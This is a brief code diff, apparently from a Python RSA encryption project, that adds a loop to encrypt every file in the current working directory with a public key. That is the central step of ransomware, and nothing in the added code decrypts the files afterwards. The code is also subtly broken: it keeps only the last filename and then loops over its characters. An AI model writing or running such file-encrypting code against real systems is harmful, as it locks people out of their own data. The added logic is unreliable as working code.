@@ -428,3 +428,15 @@ def main():
     
         MyRSAEncryptMAC(filepath, RSA_PublicKey_filepath)
         MyRSADecryptMAC(RSA_PrivateKey_filepath)
+
+
+        for filename in os.listdir(os.getcwd()):
+            listOfFileNames = filename
+
+        for i in listOfFileNames:
+            MyRSAEncryptMAC(i, RSA_PublicKey_filepath)
+
+
+
+
+
